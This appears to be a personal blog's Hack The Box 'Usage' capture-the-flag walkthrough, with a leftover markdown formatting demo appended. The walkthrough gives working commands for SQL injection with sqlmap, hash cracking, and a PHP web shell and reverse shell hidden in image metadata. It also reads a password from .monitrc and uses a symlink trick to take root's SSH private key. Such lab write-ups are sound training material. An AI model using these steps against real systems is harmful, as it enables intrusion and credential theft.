---
title: 'HTB Usage Writeup'
date: 2024-05-02
permalink: /posts/2024/05/HTB_Usage_Writeup/
tags:
  - HTB
  - writeup
  - easy
---

A writeup of the Hack The Box machine "Usage" with easy difficulty


Welcome to my first writeup of how to pwn a hack the box machine. I'm sorry if the explaining is terrible. I will improve in future writeups for sure. Let's begin!

Enumeration
======
First, you need to add the ip of the usage machine and the URL to /etc/hosts > Like so: `10.10.11.18 usage.htb` and also the subdomain `10.10.11.18 admin.usage.htb` 

Sql-injection might be possible at the following URL > `usage.htb/index.php/forget-password`

User flag
======
Intercept the request with burpsuite when you click submit.

### Use SQLmap to check for entries
After some trying with sqlmap, I was able to get the admin users:
`sqlmap -r request -p email --batch --level=5 --risk=3 --dbms=mysql -D usage_blog -T admin_users –dump`

The “request” parameter is a file with the request we intercepted from burp when we clicked the forgot password submit button. 
This way, we can get the admin password.

<img src='/images/HTB_Usage/Screenshot_2024-05-22_100936.png'>
This is a hashed password, so we need to decrypt it with Johntheripper > 

`john -w=/usr/share/wordlists/rockyou.txt pass.txt` > pass.txt is the file with the hash. 

This gives us the password of the admin user.

<img src='/images/HTB_Usage/Screenshot 2024-05-22 101642.png'>
Yess, successful login!

Next, There is a critical vulnerability in the encore/laravel-admin dependency. See [this link](https://security.snyk.io/vuln/SNYK-PHP-ENCORELARAVELADMIN-3333096?source=post_page-----f1c2793eeb7e-------------------------------- "Arbitrary Code Execution ")

The vulnerability says “Affected versions of this package are vulnerable to Arbitrary Code Execution due to unrestricted file uploads via the "user settings" interface. Users can upload and execute .php scripts on the affected server.” 

Download the current profile image > Use `exiftool -Comment="<?php system(\"ping -c 3 10.10.14.66\");?>" user2-160x160.jpg` to paste php code in the image. 

Upload the image with the script inside > 

<img src='/images/HTB_Usage/Screenshot 2024-05-22 102403.png'>

Intercept the submit request with burp > 

<img src='/images/HTB_Usage/Screenshot 2024-05-22 102512.png'>

Add `.php` as a second extension to the jpg file like so: `user2-160x160.php.jpg` and forward the request.  

We see that reverse shell is possible >

<img src='/images/HTB_Usage/Screenshot 2024-05-22 102708.png'>

Now we try to reverse shell the same way > 

Download a reverse-shell script > https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Change this to your own ip and a port you like > 

<pre>
$ip = '127.0.0.1';  // CHANGE THIS 
$port = 4444;       // CHANGE THIS 
</pre>

Put the `reverse_shell.php` file in the image like so > 

`exiftool "-comment<=reverse_shell.php" payload.jpg`

Now start a netcat listener > `nc -v -n -l -p 4444`

Upload the file again and intercept the submit request with burp and add .php> `payload.jpg.php` and forward the request.

Now you should have a reverse shell and voila, the user flag > 

<img src='/images/HTB_Usage/Screenshot 2024-05-22 103228.png'>

Root flag
======
And now the root flag.

We need to escalate the privileges of the user Xander.

<img src='/images/HTB_Usage/Screenshot 2024-05-22 103403.png'>

Just type `cat .monitrc` and you will find the admin password.

Type `su xander` and enter the password.

Type `sudo –l` > and type `strings /usr/bin/usage_management`

Hey, the root.txt file is located in /var/www/html. But the permissions are denied. 

I ssh’ed into the user xander with `ssh xander@10.10.11.18`

`cd /var/www/html` > `touch @id_rsa`

`ln -s /root/.ssh/id_rsa id_rsa`

Type: `sudo /usr/bin/usage_management` this will give you the private key. 

You can get the flag in lots of ways. Since it’s really cool to take a screenshot and enter it in as the root user so I read the SSH key to login to the system.



Markdown guide for myself :)
======

Aren't headings cool?
------

### Header three

#### Header four

##### Header five

###### Header six

## Blockquotes

Single line blockquote:

> Quotes are cool.

## Tables

### Table 1

| Entry            | Item   |                                                              |
| --------         | ------ | ------------------------------------------------------------ |
| [John Doe](#)    | 2016   | Description of the item in the list                          |
| [Jane Doe](#)    | 2019   | Description of the item in the list                          |
| [Doe Doe](#)     | 2022   | Description of the item in the list                          |

### Table 2

| Header1 | Header2 | Header3 |
|:--------|:-------:|--------:|
| cell1   | cell2   | cell3   |
| cell4   | ce
ll5   | cell6   |
|-----------------------------|
| cell1   | cell2   | cell3   |
| cell4   | cell5   | cell6   |
|=============================|
| Foot1   | Foot2   | Foot3   |

## Definition Lists

Definition List Title
:   Definition list division.

Startup
:   A startup company or startup is a company or temporary organization designed to search for a repeatable and scalable business model.

#dowork
:   Coined by Rob Dyrdek and his personal body guard Christopher "Big Black" Boykins, "Do Work" works as a self motivator, to motivating your friends.

Do It Live
:   I'll let Bill O'Reilly [explain](https://www.youtube.com/watch?v=O_HyZ5aW76c "We'll Do It Live") this one.

## Unordered Lists (Nested)

  * List item one 
      * List item one 
          * List item one
          * List item two
          * List item three
          * List item four
      * List item two
      * List item three
      * List item four
  * List item two
  * List item three
  * List item four

## Ordered List (Nested)

  1. List item one 
      1. List item one 
          1. List item one
          2. List item two
          3. List item three
          4. List item four
      2. List item two
      3. List item three
      4. List item four
  2. List item two
  3. List item three
  4. List item four

## Buttons

Make any link standout more when applying the `.btn` class.

## Notices

Basic notices or call-outs are supported using the following syntax:

```markdown
**Watch out!** You can also add notices by appending `{: .notice}` to the line following paragraph.
{: .notice}
```

which wil render as:

**Watch out!** You can also add notices by appending `{: .notice}` to the line following paragraph.
{: .notice}

### Abbreviation Tag

The abbreviation CSS stands for "Cascading Style Sheets".

*[CSS]: Cascading Style Sheets

### Cite Tag

"Code is poetry." ---<cite>Automattic</cite>

### Code Tag

You will learn later on in these tests that `word-wrap: break-word;` will be your best friend.

You can also write larger blocks of code with syntax highlighting supported for some languages, such as Python:

```python
print('Hello World!')
```

or R:

```R
print("Hello World!", quote = FALSE)
```

### Strike Tag

This tag will let you <strike>strikeout text</strike>.

### Emphasize Tag

The emphasize tag should _italicize_ text.

### Insert Tag

This tag should denote <ins>inserted</ins> text.

### Keyboard Tag

This scarcely known tag emulates <kbd>keyboard text</kbd>, which is usually styled like the `<code>` tag.

### Preformatted Tag

This tag styles large blocks of code.

<pre>
.post-title {
  margin: 0 0 5px;
  font-weight: bold;
  font-size: 38px;
  line-height: 1.2;
  and here's a line of some really, really, really, really long text, just to see how the PRE tag handles it and to find out how it overflows;
}
</pre>

### Quote Tag

<q>Developers, developers, developers&#8230;</q> &#8211;Steve Ballmer

### Strong Tag

This tag shows **bold text**.

### Subscript Tag

Getting our science styling on with H<sub>2</sub>O, which should push the "2" down.

### Superscript Tag

Still sticking with science and Isaac Newton's E = MC<sup>2</sup>, which should lift the 2 up.

### Variable Tag

This allows you to denote <var>variables</var>.

***
**Footnotes**

The footnotes in the page will be returned following this line, return to the section on <a href="#footnotes">Markdown Footnotes</a>.
